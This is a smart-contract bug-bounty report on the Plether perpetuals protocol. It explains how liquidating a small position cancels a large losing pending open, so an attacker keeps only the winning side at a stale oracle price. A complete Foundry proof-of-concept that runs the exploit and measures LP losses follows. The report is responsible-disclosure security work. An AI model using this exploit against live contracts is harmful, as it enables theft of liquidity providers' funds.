# \#99509 [SC-Critical] Liquidation cancels a losing queued open after its opposite fills at the bound price

**Submitted on Nov 13th 2026 at 23:20:36 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99509
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Relevant context

Live orders execute against the first eligible Pyth tick after their commit time, rather than a tick selected by the executing keeper. `PletherOracle._resolveHistoricalOrderBasket` calls `parsePriceFeedUpdatesUnique` with `commitTime + 1` as the lower bound. [Pyth's EVM API](https://api-reference.pyth.network/price-feeds/evm/parsePriceFeedUpdatesUnique) specifies the previous-tick check that makes the update unique. The global Router queue processes orders in FIFO order. A trader cannot directly cancel a pending order.

On liquidation, however, the Router removes all of the liquidated account's pending orders as `AccountLiquidated`. It releases their committed margin and forfeits their opening bounties. The release Router caps each opening bounty at 0.20 USDG (`OrderRouterBase.sol`), regardless of order notional. The liquidation charge itself is computed from the live position's notional (`LiquidationAccountingLib.sol`), not the pending open's notional.

## Finding description

An attacker uses two accounts with small, opposite live positions and much larger, opposite pending opens. The losing account's live position becomes liquidatable after the price move. The attacker commits the opens at the same block timestamp, placing one at the FIFO head. Let `E` be the first eligible tick after commit. If the market later moves to `M` in the direction profitable to the head order, the attacker executes that order at `E` before the current mark reaches the Engine. The open records `E` as its entry price.

The attacker then liquidates the other account at `M`. The Router charges liquidation on that account's small live position and deletes its large, losing pending open. The winner can subsequently close at a new post-commit tick near `M`. The losing large open never executes, so its historical loss never offsets the winner's gain.

`OrderLiquidationHandler._executeLiquidationAtPrice` takes the small account's queued bounties, liquidates its live position, then clears its orders:

```solidity
// packages/perps/src/router/OrderLiquidationHandler.sol
(uint64[] memory orderIds, uint256[] memory orderBountiesAssets) =
    _forfeitReservedOrderBountiesOnLiquidation(account);
outcome = engine.liquidatePosition(account, executionPrice, housePoolDepth, publishTime, keeper);
@> _clearLiquidatedAccountOrders(
       account, orderIds, orderBountiesAssets, executionPrice,
       neutralMarkPrice, housePoolDepth, publishTime, keeper
   );
```

For each pending order, cleanup releases its reservation and records a terminal failure. It does not execute the order or charge its notional:

```solidity
// packages/perps/src/router/OrderLiquidationHandler.sol
@> clearinghouse.releaseOrderReservationForTerminalCleanup(orderId);
emit OrderFailed(orderId, OrderFailReason.AccountLiquidated);
_deleteOrder(orderId, IOrderRouterAccounting.OrderStatus.Failed);
receiptInput.reason = OrderV3Types.TerminalReason.AccountLiquidated;
```

In the single-account liquidation path, `OrderLiquidationBatchLogic.executeLiquidation` first authenticates the current Pyth basket and advances the Engine mark. Thus the PoC can execute the winning order while the mark is still `E`, then install `M` through liquidation:

```solidity
// packages/perps/src/router/OrderLiquidationBatchLogic.sol
IPletherOracle.PriceSnapshot memory snapshot =
    oracle.updateLiquidationPrice{value: pythFee}(msg.sender, pythUpdateData, account);
if (snapshot.publishTime > engine.lastMarkTime()) {
@>  engine.updateMarkPrice(snapshot.markPrice, snapshot.publishTime);
}
host.executeLiquidationBatchItem(
    account, snapshot.price, snapshot.price, snapshot.markPrice,
    snapshot.publishTime, msg.sender, riskOffCutoff
);
```

Liquidation cleanup is an intentional liveness rule. The [security notes](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md) even list liquidation as a way a pending order can terminate. Those notes also say first-tick binding and lack of user cancellation prevent free options. The issue is the profitable owner-induced choice created when liquidation of a small position cancels a much larger losing open.

The public [SC-M4 report](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf) described selectable ticks and LP withdrawal causing `SOLVENCY_EXCEEDED -> ProtocolStateInvalidated -> RefundUser` for the losing order. At the frozen commit, execution binds to the unique first tick. This report instead reaches `AccountLiquidated` through a real small-position liquidation, with no LP withdrawal. It demonstrates an incomplete fix to the same economic problem under the competition rules. The public [SCAN-22 finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1196) requires an old order to execute after a newer mark has already been cached; here the winner executes before liquidation installs that mark.

## Impact explanation

The PoC starts with a flat book and 1,000,002 USDG in the pool. Each pending open is 300,000 synthetic tokens. The first eligible price is `E = 1.00000000`; the later price is `M = 1.01000000`.

| Measured result | USDG |
| --- | ---: |
| Capital supplied to both attacker accounts | 20,010.620000 |
| Attacker loss if both binding opens execute | 493.715530 |
| Attacker profit after the full attack cycle | 2,757.155695 |
| LP pool loss after fees | 2,879.025696 |

The control branch executes both opens at `E` and closes both at `M`; the attacker loses money and pool assets do not fall. The attack branch executes only the winning open at `E`, cancels the losing open through liquidation at `M`, and closes the winner at a later tick with the same mocked price as `M`. It checks that the pool's final `totalAssets()` equals its raw USDG balance and that total trader claims are zero. The measured pool loss is paid token outflow, not merely a valuation change or return of attacker collateral. These figures include in-protocol fees, VPI, bounties, and the small-position setup. They exclude gas, native Pyth fees, and paid historical-data access.

## Recommendation

Preserve liquidation's ability to close an unsafe position, but prevent its cleanup from giving that position's owner a cheap choice to cancel unrelated pending risk after the bound price is known. One approach is to charge for each liquidated account's pending risk-increasing open according to its notional and the executable historical-to-current price gap, with proceeds paid to the pool. Alternatively, reject new risk-increasing orders on accounts whose live positions can be made liquidatable within the order execution window. Check the resulting policy against normal liquidation liveness and genuine bad debt.


## Proof of Concept

## Proof of concept

Add the following file at `packages/perps/test/perps/spec/trader/INV_RT08_LiquidationStraddle.t.sol` in a fresh checkout. From `packages/perps`, run:

```sh
FOUNDRY_VIA_IR=false forge test --match-contract INV_RT08_LiquidationStraddleTest -vv
```

Result on the frozen commit: one test passed, with 2,757.155695 USDG attacker profit and 2,879.025696 USDG LP loss. The test uses the repository's Pyth mock with zero confidence to isolate the cancellation path, as the competition rules permit. It changes no in-scope contract.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

contract INV_RT08_LiquidationStraddleTest is BasePerpTest {

    struct Scenario {
        uint256 poolBefore;
        uint256 keeperWealthBefore;
        uint256 funded;
        uint256 mark;
        uint64 losing;
        uint64 winning;
        uint64 commitTime;
    }

    address constant L = address(0xC101);
    address constant S = address(0xC102);
    address constant K = address(0xC103);
    uint256 constant E = 1e8;
    uint256 constant BIG = 300_000e18;
    uint256 constant BIG_MARGIN = 10_000e6;
    uint256 constant LEGACY = 1100e18;
    uint256 constant RESIDUAL = 100e18;
    uint256 constant LEGACY_MARGIN = 4e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory c = _routerConfig();
        c.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(c);
    }

    function test_StraddleCancelsLosingOpenAndRealizesHistoricalWinner() public {
        Scenario memory scenario = _prepareScenario();
        bytes[] memory live = _stagePriceMove(scenario);
        uint256 attackBranch = vm.snapshotState();
        uint256 controlLoss = _runControl(scenario);
        assertTrue(vm.revertToState(attackBranch));
        (uint256 profit, uint256 lpLoss) = _runAttack(scenario, live);

        emit log_named_decimal_uint("initial pool assets", scenario.poolBefore, 6);
        emit log_named_decimal_uint("attack capital supplied", scenario.funded, 6);
        emit log_named_decimal_uint("forced-straddle control loss", controlLoss, 6);
        emit log_named_decimal_uint("historical E", E, 8);
        emit log_named_decimal_uint("current M", scenario.mark, 8);
        emit log_named_decimal_uint("attacker profit", profit, 6);
        emit log_named_decimal_uint("LP loss", lpLoss, 6);
    }

    function _prepareScenario() internal returns (Scenario memory scenario) {
        scenario.poolBefore = pool.totalAssets();
        assertEq(
            settlementToken.balanceOf(address(pool)), scenario.poolBefore, "initial pool assets equal raw pool cash"
        );
        scenario.keeperWealthBefore = _wealth(K) + engine.traderClaimBalanceAssets(K);
        scenario.funded = 2 * (LEGACY_MARGIN + _quoteOpenOrderExecutionBountyAssets(LEGACY) + 1e6);
        _residual(L, CfdTypes.Side.LONG);
        _residual(S, CfdTypes.Side.SHORT);
        uint256 bigBounty = _quoteOpenOrderExecutionBountyAssets(BIG);
        scenario.funded += 2 * (BIG_MARGIN + bigBounty);

        // Put the winner at the FIFO head. It can execute before liquidation installs M,
        // so the proof does not rely on the disclosed SCAN-22 older-than-mark behavior.
        scenario.winning = _commitBig(S, CfdTypes.Side.SHORT);
        scenario.losing = _commitBig(L, CfdTypes.Side.LONG);

        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(scenario.winning);
        scenario.commitTime = pending.commitTime;
        scenario.mark = 101_000_000;
        assertFalse(engineLens.previewLiquidation(L, E).liquidatable, "residual starts solvent");
        vm.warp(block.timestamp + 5);
        vm.roll(block.number + 1);
        ICfdEngineTypes.LiquidationPreview memory p = engineLens.previewLiquidation(L, scenario.mark);
        assertTrue(p.liquidatable, "one-percent move liquidates losing residual");
        assertGt(scenario.mark, E, "historical short must win");
    }

    function _stagePriceMove(
        Scenario memory scenario
    ) internal returns (bytes[] memory live) {
        live = _mockPythUpdateData(scenario.mark);
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(E)), 0, -8, scenario.commitTime + 1, scenario.commitTime
        );
    }

    function _runControl(
        Scenario memory scenario
    ) internal returns (uint256 controlLoss) {
        OrderV3Types.ExecutionResult memory winningControl = _exec(scenario.winning, E);
        OrderV3Types.ExecutionResult memory losingControl = _exec(scenario.losing, E);
        assertEq(uint8(losingControl.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(uint8(winningControl.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 losingControlSize,, uint256 losingControlEntry,,,,) = engine.positions(L);
        (uint256 winningControlSize,, uint256 winningControlEntry,,,,) = engine.positions(S);
        assertEq(losingControlEntry, E, "losing open was executable at historical tick");
        assertEq(winningControlEntry, E, "winning open was executable at historical tick");

        uint64 losingClose = _commitClose(L, CfdTypes.Side.LONG, losingControlSize, type(uint256).max, "control-L");
        uint64 winningClose = _commitClose(S, CfdTypes.Side.SHORT, winningControlSize, 1, "control-S");
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        assertEq(uint8(_exec(losingClose, scenario.mark).status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(uint8(_exec(winningClose, scenario.mark).status), uint8(OrderV3Types.LifecycleStatus.Executed));
        uint256 controlWealth = _totalWealth(scenario.keeperWealthBefore);
        assertLt(controlWealth, scenario.funded, "forced straddle loses fees instead of extracting LP cash");
        assertGe(pool.totalAssets(), scenario.poolBefore, "LPs do not lose when both binding opens execute");
        controlLoss = scenario.funded - controlWealth;
    }

    function _runAttack(
        Scenario memory scenario,
        bytes[] memory live
    ) internal returns (uint256 profit, uint256 lpLoss) {
        OrderV3Types.ExecutionResult memory opened = _exec(scenario.winning, E);
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(engine.lastMarkPrice(), E, "winner executes before the current mark is installed");
        assertEq(router.nextExecuteId(), scenario.losing, "losing tail is now the queue head");

        vm.prank(L);
        router.executeLiquidation(L, live);
        assertEq(
            uint8(router.lifecycleBook().terminalOutcome(scenario.losing).reason),
            uint8(OrderV3Types.TerminalReason.AccountLiquidated)
        );
        assertEq(router.nextExecuteId(), 0, "liquidation deletes the losing tail");
        assertEq(engine.lastMarkPrice(), scenario.mark, "liquidation installs the current mark");
        (uint256 size,, uint256 entry,,,,) = engine.positions(S);
        assertEq(size, RESIDUAL + BIG);
        assertEq(entry, E, "winner records the historical tick as entry");

        uint64 closeId = _commitClose(S, CfdTypes.Side.SHORT, size, 1, "realize");
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        OrderV3Types.ExecutionResult memory closed = _exec(closeId, scenario.mark);
        assertEq(uint8(closed.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(engine.lastMarkPrice(), scenario.mark, "winner closes at a fresh later tick");
        (size,,,,,,) = engine.positions(S);
        assertEq(size, 0);

        uint256 wealth = _totalWealth(scenario.keeperWealthBefore);
        assertGt(wealth, scenario.funded, "full attack cycle profit");
        profit = wealth - scenario.funded;
        uint256 poolAfter = pool.totalAssets();
        assertLt(poolAfter, scenario.poolBefore, "LP cash loss after all fees");
        lpLoss = scenario.poolBefore - poolAfter;
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "profit is paid in cash, not an IOU");
        assertEq(settlementToken.balanceOf(address(pool)), poolAfter, "LP loss is raw pool token outflow");
    }

    function _residual(
        address a,
        CfdTypes.Side side
    ) internal {
        _open(a, side, LEGACY, LEGACY_MARGIN);
        OrderV3Types.OrderRequest memory closeRequest = _req(
            side,
            LEGACY - RESIDUAL,
            0,
            side == CfdTypes.Side.LONG ? type(uint256).max : 1,
            true,
            keccak256(abi.encode(a, "close"))
        );
        vm.prank(a);
        uint64 id = router.commitOrder(closeRequest);
        _exec(id, E);
        uint256 free = _freeSettlementAssets(a);
        if (free != 0) {
            vm.prank(a);
            clearinghouse.withdraw(a, free);
        }
    }

    function _commitBig(
        address a,
        CfdTypes.Side side
    ) internal returns (uint64 id) {
        _fundTrader(a, BIG_MARGIN + _quoteOpenOrderExecutionBountyAssets(BIG));
        OrderV3Types.OrderRequest memory request = _req(
            side,
            BIG,
            BIG_MARGIN,
            side == CfdTypes.Side.LONG ? 1 : type(uint256).max,
            false,
            keccak256(abi.encode(a, "big"))
        );
        vm.prank(a);
        id = router.commitOrder(request);
    }

    function _commitClose(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 target,
        string memory tag
    ) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory request = _req(side, size, 0, target, true, keccak256(abi.encode(a, tag)));
        vm.prank(a);
        id = router.commitOrder(request);
    }

    function _open(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        _fundTrader(a, margin + _quoteOpenOrderExecutionBountyAssets(size) + 1e6);
        OrderV3Types.OrderRequest memory request = _req(
            side,
            size,
            margin,
            side == CfdTypes.Side.LONG ? 1 : type(uint256).max,
            false,
            keccak256(abi.encode(a, size))
        );
        vm.prank(a);
        uint64 id = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory r = _exec(id, E);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed));
    }

    function _exec(
        uint64 id,
        uint256 price
    ) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(K);
        r = router.executeOrder(id, data);
    }

    function _req(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 target,
        bool close,
        bytes32 client
    ) internal view returns (OrderV3Types.OrderRequest memory r) {
        r = OrderV3Types.OrderRequest({
            clientOrderId: client,
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _wealth(
        address a
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(a) + clearinghouse.balanceAssets(a);
    }

    function _totalWealth(
        uint256 keeperWealthBefore
    ) internal view returns (uint256) {
        return _wealth(L) + _wealth(S) + _wealth(K) - keeperWealthBefore + engine.traderClaimBalanceAssets(L)
            + engine.traderClaimBalanceAssets(S) + engine.traderClaimBalanceAssets(K);
    }

}
```
